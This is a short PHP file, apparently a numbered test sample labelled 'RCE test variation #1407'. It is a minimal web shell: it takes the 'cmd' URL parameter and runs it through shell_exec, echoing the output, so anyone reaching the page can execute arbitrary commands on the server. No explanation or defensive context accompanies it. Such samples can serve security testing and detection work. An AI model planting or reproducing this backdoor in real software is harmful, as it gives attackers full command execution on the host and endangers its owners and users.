<?php
// RCE test variation #1407
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>